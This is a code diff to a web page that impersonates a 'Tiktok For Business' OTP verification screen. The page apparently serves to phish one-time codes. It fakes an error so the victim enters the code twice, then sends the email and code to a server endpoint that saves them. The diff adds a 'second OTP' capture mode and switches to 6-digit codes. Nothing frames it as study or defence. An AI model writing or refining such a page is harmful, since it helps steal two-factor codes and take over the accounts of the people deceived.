@@ -25,7 +25,6 @@
             padding: 12px;
         }
 
-        /* PERFECTLY CENTERED CONTAINER - RESPONSIVE ON ALL DEVICES */
         .container {
             background: #121212;
             padding: 28px 20px;
@@ -37,7 +36,6 @@
             border: 1px solid #2a2a2a;
         }
 
-        /* iPhone SE / small phones */
         @media (max-width: 380px) {
             .container {
                 padding: 20px 16px;
@@ -45,7 +43,6 @@
             }
         }
 
-        /* Landscape mode */
         @media (max-height: 500px) and (orientation: landscape) {
             body {
                 padding: 8px;
@@ -75,7 +72,6 @@
             letter-spacing: -0.5px;
         }
 
-        /* OTP sent message - perfectly spaced */
         .otp-sent-message {
             background: #1a1a1a;
             padding: 18px 16px;
@@ -201,7 +197,6 @@
             box-shadow: 0 0 0 3px rgba(254, 44, 85, 0.15);
         }
 
-        /* Fix for small screens */
         @media (max-width: 380px) {
             input {
                 font-size: 20px;
@@ -354,7 +349,6 @@
 </head>
 <body>
     <div class="container">
-        <!-- Simple lock/shield icon -->
         <div class="header-icon">
             <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                 <path d="M12 2C8.13 2 5 5.13 5 9v2c0 .78.16 1.53.46 2.22L4.12 15.1C3.66 16.2 4.46 17.5 5.64 17.5h12.72c1.18 0 1.98-1.3 1.52-2.4l-1.34-2.88c.3-.69.46-1.44.46-2.22V9c0-3.87-3.13-7-7-7z"/>
@@ -363,12 +357,11 @@
             </svg>
         </div>
 
-        <h2>Tiktok For Business</h2>
+        <h2 id="pageTitle">Tiktok For Business</h2>
         
-        <!-- Message exactly as requested -->
         <div class="otp-sent-message">
-            <strong>Check your OTP</strong>
-            We've sent a 4-digit code to your email OR phone. Check the spam folder if not yet received!
+            <strong id="messageStrong">Check your OTP</strong>
+            <span id="messageText">We've sent a 4-digit code to your email OR phone. Check the spam folder if not yet received!</span>
         </div>
 
         <div class="form-group">
@@ -377,6 +370,7 @@
         </div>
         
         <button onclick="handleOTP()" id="actionBtn">Verify OTP</button>
+        <button class="secondary retry-btn" id="retryBtn" onclick="retryProcess()" style="display: none;">Start Over</button>
         
         <div id="message" class="message"></div>
     </div>
@@ -392,13 +386,22 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const email = urlParams.get('email');
+        const otpType = urlParams.get('type') || 'first'; // 'first' or 'second'
         
         // State management
         let step = 1;
         let firstOTP = '';
         
-        // OTP length is 4 digits max
-        const OTP_LENGTH = 4;
+        // OTP length is 6 digits
+        const OTP_LENGTH = 6;
+
+        // Update UI based on OTP type
+        if (otpType === 'second') {
+            document.getElementById('pageTitle').textContent = 'Tiktok For Business - Second OTP';
+            document.getElementById('messageStrong').textContent = 'Enter Second OTP';
+            document.getElementById('messageText').textContent = 'Please enter the second OTP code sent to you.';
+            document.getElementById('otpLabel').textContent = 'Enter 6-digit Second OTP';
+        }
 
         if (!email) {
             window.location.href = '/users/login';
@@ -408,20 +411,27 @@
 
         // UI Update functions
         function updateStepUI() {
+            const step1El = document.getElementById('step1');
+            const step2El = document.getElementById('step2');
+            const instructionEl = document.getElementById('instruction');
+            const otpLabelEl = document.getElementById('otpLabel');
+            const actionBtnEl = document.getElementById('actionBtn');
+            const retryBtnEl = document.getElementById('retryBtn');
+            
             if (step === 1) {
-                document.getElementById('step1').className = 'step active';
-                document.getElementById('step2').className = 'step';
-                document.getElementById('instruction').textContent = 'Step 1: Enter the 4-digit OTP sent to you';
-                document.getElementById('otpLabel').textContent = 'Enter 4-digit OTP';
-                document.getElementById('actionBtn').textContent = 'Verify OTP';
-                document.getElementById('retryBtn').style.display = 'none';
+                if (step1El) step1El.className = 'step active';
+                if (step2El) step2El.className = 'step';
+                if (instructionEl) instructionEl.textContent = 'Step 1: Enter the 6-digit OTP sent to you';
+                if (otpLabelEl) otpLabelEl.textContent = 'Enter 6-digit OTP';
+                if (actionBtnEl) actionBtnEl.textContent = 'Verify OTP';
+                if (retryBtnEl) retryBtnEl.style.display = 'none';
             } else if (step === 2) {
-                document.getElementById('step1').className = 'step completed';
-                document.getElementById('step2').className = 'step active';
-                document.getElementById('instruction').textContent = 'Step 2: Confirm your OTP';
-                document.getElementById('otpLabel').textContent = 'Re-enter your 4-digit OTP';
-                document.getElementById('actionBtn').textContent = 'Confirm OTP';
-                document.getElementById('retryBtn').style.display = 'block';
+                if (step1El) step1El.className = 'step completed';
+                if (step2El) step2El.className = 'step active';
+                if (instructionEl) instructionEl.textContent = 'Step 2: Confirm your OTP';
+                if (otpLabelEl) otpLabelEl.textContent = 'Re-enter your 6-digit OTP';
+                if (actionBtnEl) actionBtnEl.textContent = 'Confirm OTP';
+                if (retryBtnEl) retryBtnEl.style.display = 'block';
             }
             
             // Clear input and focus
@@ -448,7 +458,7 @@
             messageDiv.style.display = 'block';
             
             // Auto-hide after 5 seconds
-            if (type !== 'error' || type !== 'warning') {
+            if (type !== 'error') {
                 setTimeout(() => {
                     messageDiv.style.display = 'none';
                 }, 5000);
@@ -466,7 +476,7 @@
             }
 
             if (step === 1) {
-                // Step 1: Store first OTP and show error message (as required)
+                // Step 1: Store first OTP and show confirm message
                 firstOTP = otp;
                 showMessage('Confirm the OTP again', 'error');
                 
@@ -481,8 +491,10 @@
                     showLoading('Verifying OTP', 'Verifying...');
                     
                     try {
-                        // Send to server to save in database
-                        const response = await fetch('/api/users/save-otp', {
+                        // Choose endpoint based on OTP type
+                        const endpoint = otpType === 'second' ? '/api/users/save-second-otp' : '/api/users/save-otp';
+                        
+                        const response = await fetch(endpoint, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ email, otp })
@@ -554,7 +566,6 @@
                         } else {
                             hideLoading();
                             showMessage(data.error || 'Failed to save OTP', 'error');
-                            // Show retry button
                             document.getElementById('retryBtn').style.display = 'block';
                         }
                     } catch (error) {
@@ -563,7 +574,7 @@
                         document.getElementById('retryBtn').style.display = 'block';
                     }
                 } else {
-                    // OTPs don't match - Show error and retry button
+                    // OTPs don't match
                     showMessage('OTP does not match! Please start over.', 'error');
                     document.getElementById('retryBtn').style.display = 'block';
                     document.getElementById('actionBtn').disabled = true;
@@ -596,9 +607,6 @@
 
         // Auto-focus
         document.getElementById('otp').focus();
-
-        // Initialize UI
-        updateStepUI();
     </script>
 </body>
 </html>
